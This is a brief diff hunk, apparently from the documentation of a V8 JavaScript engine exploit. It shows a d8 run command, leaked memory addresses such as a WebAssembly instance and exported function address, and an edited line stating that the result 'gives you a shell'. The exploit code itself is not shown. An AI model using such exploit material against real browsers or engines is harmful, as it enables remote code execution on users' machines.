@@ -47,7 +47,7 @@ Run
 
         ~/v8-11-4-0/out/x64-release/d8 e[+] instance_addr = 0x19c3d8
 
-Result
+Result gives you a shell
 
                 [+] tbl_addr = 0x4dc04
                 [+] exported_func_addr = 0x19c55c
